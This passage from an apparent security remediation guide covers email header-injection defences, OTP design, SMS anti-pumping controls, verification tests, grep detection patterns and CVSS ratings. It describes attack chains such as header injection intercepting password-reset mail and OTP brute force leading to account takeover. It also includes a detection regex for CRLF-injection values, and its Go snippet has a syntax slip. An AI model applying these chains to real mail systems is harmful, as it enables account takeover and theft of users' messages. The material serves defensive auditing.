// Node/JS — apply to EVERY string bound for from/to/cc/bcc/subject/replyTo/headers
function stripCrLf(s) { return String(s ?? '').replace(/[\r\n]+/g, ' ').trim(); }
```

```python
# Python — stack-agnostic helper
def strip_crlf(value: str) -> str:
    return "".join(ch for ch in value if ch not in "\r\n").strip()
```

```php
// PHP
function strip_crlf(string $s): string { return trim(preg_replace('/[\r\n]+/', ' ', $s)); }
```

```java
// Java — prefer strict parsing over manual strips, then both
InternetAddress addr = new InternetAddress(userInput, true); // strict=true throws on CR/LF/control chars
addr.validate();
```

```go
// Go
if _, err := net/mail.ParseAddress(userInput); err != nil { return err } // reject; never hand-build headers from raw user strings
```

Rule regardless of stack: server-fixed From identity; validated recipients; stripped control characters on every remaining header-bound value; user content confined to body/template positions.

### OTP Design Spec Block

- **Generation**: CSPRNG only — `crypto.randomInt(0, 1000000)` padded to 6 digits (Node), `secrets.randbelow(1_000_000)` zero-padded (Python), `SecureRandom.nextInt(1_000_000)` zero-padded (Java). No `Math.random`, no time-derived codes.
- **Expiry**: ~5 minutes (sane range 3–10); enforce server-side at check time, not via cleanup jobs alone.
- **Single-use**: consume atomically — delete the row or flip used-flag inside the same transaction that validates; concurrent submissions must not double-spend one code.
- **Attempts**: cap at 5 wrong entries per code, then invalidate the code; require fresh request. Cap resends per recipient per window too.
- **Errors**: uniform response for wrong/expired/unknown codes ("Invalid or expired code"); never reveal which.
- **Storage**: store hashed like reset tokens where feasible; never log codes (-> SECRETS module logging rules).
- **Channel honesty**: document SMS as weaker factor (SIM swap) in threat model; offer TOTP/app-based upgrade path (-> AUTHN module hierarchy).

### SMS Anti-Abuse Control Bundle

1. **E.164 validation anchored**, e.g. `^\+[1-9]\d{7,14}$` applied after normalization (use a maintained number-parsing library such as libphonenumber rather than regex-only for country-aware checks).
2. **Per-user daily send caps** and a **global daily ceiling** shared across the platform (pumping detection at scale).
3. **Blocked-range lists**: configurable prefix/range denylist for known premium/range abuse targets, reviewed periodically.
4. **Provider cost visibility**: enable cost/usage alerting or billing webhooks where the provider offers them; wire thresholds to paging. Generic guidance — consult your provider's current mechanism; do not assume specific products.

## Verification & Validation

### Post-Fix Verifies

1. **Header injection rejected/sanitized**: re-send the payload cheat-sheet probes through the same flows; expected observable = delivery succeeds with payload confined to body/display text, or send call rejects with a validation error; no smuggled headers appear in the received message you own.
2. **DMARC record live** (requires-network): `dig +short TXT _dmarc.example.com` returns the staged value; aggregate reports (`rua`) begin arriving; SPF/DKIM digs match repo artifacts.
3. **Lockout engages at threshold**: repeat dynamic test 3; expected observable = rejection or code-invalidation at/below the 5-attempt cap, and a fresh code required afterwards.
4. **Caps trip**: resend-flood probe stops at configured limits; SMS daily cap blocks attempt 26 of 25 (or whatever the configured number) with a uniform error.
5. **Webhooks verify-first**: replay an unsigned request and a signed-but-stale-timestamp request at the handler; expected observable = 4xx, no state mutation, security-log entry.

### Negative Tests (Legit Flows Unaffected)

1. **Deliverability smoke test**: transactional mail (welcome, password reset, receipt) reaches inboxes you control across major providers; check spam folders explicitly and re-test over several days — policy flips shift reputation gradually, so treat day-one inboxing as provisional.
2. **Third-party sender regression**: after any `-all` flip, verify billing/invoicing/helpdesk/mail-marketing systems still deliver (their dunning mail is the usual casualty). Inventory from Remediation step 1 drives this checklist; missing entries here are how over-strict SPF ships.
3. **Resend throttle fairness**: a legitimate slow resend (past cooldown) still works for real users; caps don't lock out typo-retry behavior.
4. **Verification UX intact**: new-account verification completes end-to-end within expiry window; magic links work exactly once and fail cleanly on second click with an actionable message.

### Greps Post-Fix

```
rg -n 'v=spf1[^"]*\+(all|\?)' -g '*.tf' .                 # expect: no matches
rg -n '_dmarc' -g '*.tf' -A6 .                            # expect: p=quarantine|reject present
rg -n -C5 'Math\.random|mt_rand|random\.randint' src/    # expect: no hits within 5 lines of OTP/token generation
rg -n '(?i)(bcc|cc|to)\s*[:=].*(\+|%0a|%0d|\r|\n)' src/   # expect: only sanitized helpers
rg -n 'hmac' webhook_handler.ext                           # expect: verify precedes parse/action
```

## Severity Assessment

Anchors use CVSS v3.1 base vectors; adjust for context and chaining per report standards.

| Anchor | Vector | Score | Rationale |
|---|---|---|---|
| High: email-verification bypass granting trusted status | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 | Unauthenticated attacker mints or guesses trust state; full identity-integrity compromise feeding account flows |
| High: header injection enabling BCC-mass-exfiltration of notification contents | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N | 7.1 | Authenticated low-priv user redirects other users' notification bodies (password resets if shared pipeline) to self |
| Medium: no DMARC (or permanent p=none) on auth-email sending domain | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N | 4.6 | Spoofed mail requires victim interaction; UI:R reflects that; enables phishing-via-your-brand |
| Medium: SMS pumping controls absent with financial exposure | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L | 6.4 | Direct financial drain via triggered sends; modeled as integrity/availability of spend controls |
| Low: verbose number-validity responses alone | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 numeric | Numerically Medium; qualitatively Low standalone because enumerated accounts grant nothing without additional flaws — downgrade justified, upgrade immediately when chained with absent OTP throttles |

**Chaining emphasis**: email-flow flaws rarely stay contained — they feed password-reset and account-takeover chains (impact depth -> AUTHN module). Verification bypass → attacker sets trusted status then triggers password reset; header injection → intercept password-reset mails sent through the same pipeline; enumeration + absent throttles → direct OTP brute force to ATO; contact-change release-before-verify → full recovery hijack. Always write the chain in the finding's impact statement, citing the downstream module.

## Common False Positives

1. **Transactional-provider managed bounce handling misread as app flaw**: providers handle bounces, suppression lists, and reputation centrally; absence of app-side bounce logic is not a finding unless the app also self-manages SMTP.
2. **Internal-mailer-only systems without external recipients**: an admin tool mailing only internal staff has materially smaller spoofing/phishing impact — downgrade severity and note scope honestly rather than dropping the observation.
3. **p=none DMARC during documented rollout phase**: a time-boxed monitoring phase with `rua` reporting and a written progression plan is a valid exception, not a permanent pass — verify the plan exists and check its dates before flagging; flag only unbounded `p=none`.
4. **DKIM selector absence when third parties sign**: marketing/billing platforms often sign under their own domain or delegated subdomains; confirm no signing occurs for the domain before flagging missing DKIM artifacts.
5. **E.164 strictness rejecting legacy formats**: rejecting non-E.164 input is the control working, not a usability bug; flag only if legitimate documented number ranges are excluded.

## References

### RFCs

- RFC 7208 — Sender Policy Framework (SPF) for Authorizing Use of Domains in Email: https://datatracker.ietf.org/doc/html/rfc7208
- RFC 6376 — DomainKeys Identified Mail (DKIM) Signatures: https://datatracker.ietf.org/doc/html/rfc6376
- RFC 7489 — Domain-based Message Authentication, Reporting and Conformance (DMARC): https://datatracker.ietf.org/doc/html/rfc7489
- RFC 5322 — Internet Message Format (header structure underlying injection mechanics): https://datatracker.ietf.org/doc/html/rfc5322

### Best Practices

- M3AAWG Sender Best Communications Practices (sender authentication and reputation guidance from the Messaging Malware Mobile Anti-Abuse Working Group): https://www.m3aawg.org/
- NIST SP 800-63B Digital Identity Guidelines — Authentication (OTP/authenticator assurance expectations): https://pages.nist.gov/800-63-3/sp800-63b.html

### CWE Entries

- CWE-93 Improper Neutralization of CRLF Sequences ('CRLF Injection'): https://cwe.mitre.org/data/definitions/93.html
- CWE-203 Observable Response Discrepancy: https://cwe.mitre.org/data/definitions/203.html
- CWE-307 Improper Restriction of Excessive Authentication Attempts: https://cwe.mitre.org/data/definitions/307.html
- CWE-345 Insufficient Verification of Data Authenticity: https://cwe.mitre.org/data/definitions/345.html
- CWE-640 Weak Password Recovery Mechanism for Forgotten Password (adjacent: contact-change/magic-link recovery logic): https://cwe.mitre.org/data/definitions/640.html

### Tooling & Numbering Plans

- Google libphonenumber (country-aware phone parsing/validation): https://github.com/google/libphonenumber
- OWASP Cheat Sheet Series — Authentication / Multi-Factor Authentication guidance: https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html

